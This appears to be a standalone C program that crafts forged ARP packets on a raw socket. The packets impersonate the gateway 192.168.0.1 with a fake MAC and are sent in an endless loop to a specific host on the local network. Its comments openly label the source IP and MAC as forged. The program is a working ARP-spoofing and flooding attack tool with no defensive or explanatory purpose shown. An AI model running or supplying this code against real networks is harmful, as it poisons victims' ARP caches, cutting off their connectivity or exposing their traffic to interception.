#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>

#include <pthread.h>

static unsigned char s_ip_frame_data[ETH_DATA_LEN];
static size_t  s_ip_frame_size = 0;

int main(int argc,char** argv)
{
    struct ether_header *eth = NULL;
    struct ether_arp *arp = NULL;
    struct ifreq ifr;
    struct in_addr daddr;  //目标IP
    struct in_addr saddr;  //源IP
    struct sockaddr_ll sll;

    int skfd;
    int n = 0;

    // 84-ef-18-4d-96-df ---->无线网卡 老古
    // 80-fa-5b-36-b7-e2 ---->本地网卡
    //unsigned char dmac[ETH_ALEN] = {0x84,0xef,0x18,0x4d,0x96,0xdf};  //目标MAC /*伪造 源MAC*/
    unsigned char dmac[ETH_ALEN] = {0x84,0xef,0x18,0x4d,0x96,0xdf};  //目标MAC /*伪造 源MAC*/
    //34-96-72-1d-32-6f ---->网关
    //unsigned char smac[ETH_ALEN] = {0x34,0x96,0x72,0x1D,0x32,0x6f};  //目标MAC /*伪造 源MAC*/
    unsigned char smac[ETH_ALEN] = {0x00,0x11,0x22,0x33,0x44,0x55};

    daddr.s_addr = inet_addr("192.168.0.103");
    /*伪造 源IP*/
    saddr.s_addr = inet_addr("192.168.0.1");   //网关ip

    memset(s_ip_frame_data, 0x00, sizeof(unsigned char)*ETH_DATA_LEN);

    /*创建原始套接字*/
    skfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (skfd < 0) {
        perror("socket");
        return -1;
    }

    bzero(&ifr,sizeof(ifr));
    strcpy(ifr.ifr_ifrn.ifrn_name , "eth1");
    if (-1 == ioctl(skfd, SIOCGIFINDEX, &ifr)) {
        perror("ioctl");
        return -1;
    }
    printf("ifr_ifindex = %d\n", ifr.ifr_ifru.ifru_ivalue);

    bzero(&sll, sizeof(sll));
    sll.sll_ifindex  = ifr.ifr_ifru.ifru_ivalue;
    sll.sll_family   = PF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);

    /*构造以太报文*/
    eth = (struct ether_header*)s_ip_frame_data;
    eth->ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth->ether_dhost, dmac, ETH_ALEN);
    memcpy(eth->ether_shost, smac, ETH_ALEN);

    /*构造ARP报文*/
    arp = (struct ether_arp*)(s_ip_frame_data + sizeof(struct ether_header));
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETH_ALEN;
    arp->arp_pln = 4;
    arp->arp_op  = htons(ARPOP_REQUEST);

    memcpy(arp->arp_sha, smac, ETH_ALEN);
    memcpy(arp->arp_spa, &saddr.s_addr, 4);
    /*
     *     memcpy(arp->arp_tha, dmac, ETH_ALEN);*/
    memcpy(arp->arp_tpa, &daddr.s_addr, 4);

    int i;
    for(i = 0; i < 1500; ++i)
    {
        pthread_t pid = fork();
        if(pid == 0)
        {
            s_ip_frame_size = sizeof(struct ether_header) + sizeof(struct ether_arp);
            while(1)
            {
                n = sendto(skfd, s_ip_frame_data, s_ip_frame_size, 0,
                        (struct sockaddr*)&sll, sizeof(sll));
                if (n < 0) {
                    perror("sendto");
                }
                else {
                    printf("sendto() n = %d \n", n);
                }
            }
        }
        close(skfd);
        return 0;
    }
}
